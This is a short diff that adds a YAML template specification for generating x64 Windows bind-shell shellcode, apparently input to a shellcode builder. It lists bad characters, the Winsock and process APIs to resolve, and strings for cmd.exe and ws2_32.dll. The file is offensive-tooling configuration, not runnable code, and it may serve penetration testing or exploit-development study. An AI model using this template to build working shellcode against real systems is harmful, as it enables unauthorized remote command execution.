@@ -1,0 +1,26 @@
+# Bind shell - x64 (kernel32 + ws2_32)
+arch: x64
+template: ir_bind_shell
+badchars: ["00", "0A", "0D"]
+
+functions:
+  - CreateProcessA
+  - LoadLibraryA
+  - WSAStartup
+  - WSASocketA
+  - bind
+  - listen
+  - accept
+
+variables:
+  - listen_socket
+  - client_socket
+
+strings:
+  - label: cmd
+    value: cmd.exe
+    method: mov
+    dest: rdi
+  - label: ws2_dll
+    value: ws2_32.dll
+    method: push
